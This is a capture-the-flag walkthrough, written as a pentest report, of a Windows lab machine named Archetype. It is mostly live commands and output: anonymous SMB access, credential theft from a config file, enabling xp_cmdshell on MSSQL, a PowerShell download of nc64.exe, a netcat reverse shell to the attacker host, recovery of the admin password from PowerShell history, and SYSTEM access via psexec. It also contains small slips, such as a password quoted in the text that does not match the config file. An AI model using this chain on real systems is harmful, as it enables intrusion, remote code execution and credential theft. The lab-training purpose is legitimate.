# Pentest Report for Archetype Box
## CVSS 3.1 Score:8.1 (High)

### CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
### CWE-306: Missing Authentication for Critical Function

Description: During our penetration test, we identified a Broken Access Control vulnerability via SMB, which allowed unauthorized access to sensitive data, including user credentials for the hosted database. Additionally, we discovered that the SQL server configuration lacked proper access controls, leading to the potential exposure of critical database information.

In further stages of the test, we successfully exploited these vulnerabilities to gain unauthorized access to the system, eventually escalating our privileges to administrative levels. This allowed us to retrieve user and admin flags, demonstrating the severity of these security weaknesses.

Impact: Weak acces control thought SMB service can lead to inadvertent exposure of sensitive data, such as user credentials for system access.

POC:

Begin the penetration test by conducting initial scans on the target system.


```
nmap -sV -sC 10.129.150.23
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 14:16 BST
Nmap scan report for 10.129.150.23
Host is up (0.062s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-09-30T13:12:57
|_Not valid after:  2053-09-30T13:12:57
|_ssl-date: 2023-09-30T13:17:03+00:00; +2s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-09-30T13:16:55
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-09-30T06:16:57-07:00
|_clock-skew: mean: 1h45m03s, deviation: 3h30m02s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.68 seconds

We can se that ports are open and Mincrosoft SQL database is open on 1433 
```
Use the smbclient tool to enumerate SMB shares on the target machine.
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```
Identify that the "backups" share is accessible without administrative privileges.
```
Access the "backups" share using smbclient.
smbclient -N  \\\\10.129.150.23\\backups
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

		5056511 blocks of size 4096. 2534633 blocks available
```
Download the "prod.disConfig" file using the "get" command to investigate its contents.
```
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \>
```
Examine the contents of the "prod.disConfig" file and find authentication data for the user ***sql_svc*** with the password ***Mp13g4c0r23.***

```
$cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
```
Search for and locate the "mssqlclient.py" tool.
Use "mssqlclient.py" with the obtained credentials to successfully connect to the SQL Server.

```
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.150.23 -windows-auth
Impacket v0.12.0.dev1+20230928.173259.06217f05 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```
Discover that command execution on the machine requires elevated privileges, which are currently unavailable.
Decide to use Metasploit to escalate privileges to the administrative level.
```

Module options (auxiliary/admin/mssql/mssql_escalate_dbowner):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD             M3g4c0rp123      no        The password for the specified username
   RHOSTS               10.129.207.19    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sql_svc          no        The username to authenticate as
   USE_WINDOWS_AUTHENT  true             yes       Use windows authentification (requires DOMAIN option set)


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(admin/mssql/mssql_escalate_dbowner) >> exploit
[*] Running module against 10.129.207.19

[*] 10.129.207.19:1433 - Attempting to connect to the database server at 10.129.207.19:1433 as sql_svc...
[+] 10.129.207.19:1433 - Connected.
[*] 10.129.207.19:1433 - Checking if sql_svc has the sysadmin role...
[+] 10.129.207.19:1433 - sql_svc has the sysadmin role, no escalation required.
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(admin/mssql/mssql_escalate_dbowner) >> 

```
Identify that the "xp_cmdshell" command is turned off, preventing command execution.
```
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'whoami';
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
 
```
Research and find the steps to reconfigure the "xp_cmdshell" configuration.
```

SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC sp_configure 'show advanced options', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@msdb)> RECONFIGURE
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC sp_configure 'xp_cmdshell', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@msdb)> RECONFIGURE
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'whoami';
output              
-----------------   
archetype\sql_svc   

NULL                

SQL (ARCHETYPE\sql_svc  dbo@msdb)> 
```
Now that command execution is allowed, execute commands on the target machine.

Download the "nc63.exe" file, which is essential for building a reverse shell.
Set up an HTTP server and configure it to listen on port 80.
```
 sudo python3 -m http.server 80
[sudo] password for parrot: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
sudo nc -lnvp 443
[sudo] password for parrot: 
listening on [any] 443 ...
```
Host the "nc64.exe" file on the HTTP server.
Execute the shell by downloading and running the "nc64.exe" file on the target machine.

```
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; wget http://10.10.14.172/nc64.exe -outfile nc64.exe ';
output   
------   
NULL     
```
```
10.129.207.19 - - [01/Oct/2023 11:35:21] "GET /nc64.exe HTTP/1.1" 200 -

SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; .\nc64.exe -e cmd.exe 10.10.14.172 443';
```
```
connect to [10.10.14.172] from (UNKNOWN) [10.129.207.19] 49678
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\sql_svc\Downloads>
```
Utilize the WinPEAS script to further assess the system and identify potential privilege escalation opportunities.
Upload the WinPEAS script to the target machine and execute it.
```
Analyzing Windows Files Files (limit 70)
    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    C:\Users\Default\NTUSER.DAT
    C:\Users\sql_svc\NTUSER.DAT
```

Explore the PowerShell history to find valuable information.
Discover the administrator password, "MEGACORP_4dm1n!!," within the PowerShell history.
```
PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
cat ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

```
Utilize the "psexec.py" tool from Impacket to connect to the target machine as an administrator.

```

python3 psexec.py administrator@10.129.207.19
Impacket v0.12.0.dev1+20230928.173259.06217f05 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.207.19.....
[*] Found writable share ADMIN$
[*] Uploading file HAhjaggI.exe
[*] Opening SVCManager on 10.129.207.19.....
[*] Creating service iFPS on 10.129.207.19.....
[*] Starting service iFPS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoaim
'whoaim' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```

Now that administrative access is established, locate and retrieve both the user and administrator flags on the target system.

```
PS C:\Users\sql_svc\Desktop> cat user.txt
cat user.txt
3e7b102e78218e935bf3f4951fec21a3


PS C:\Users\Administrator\Desktop> cat root.txt
b91ccec3305e98240082d4474b848528

```

